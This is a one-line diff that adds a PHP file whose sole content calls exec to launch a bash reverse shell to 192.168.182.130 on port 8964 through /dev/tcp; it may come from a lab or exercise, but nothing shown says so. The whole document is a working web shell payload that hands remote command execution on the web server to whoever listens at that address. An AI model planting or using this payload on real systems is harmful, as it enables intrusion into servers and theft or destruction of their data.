@@ -1,0 +1,1 @@
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.182.130/8964 0>&1'"); ?>
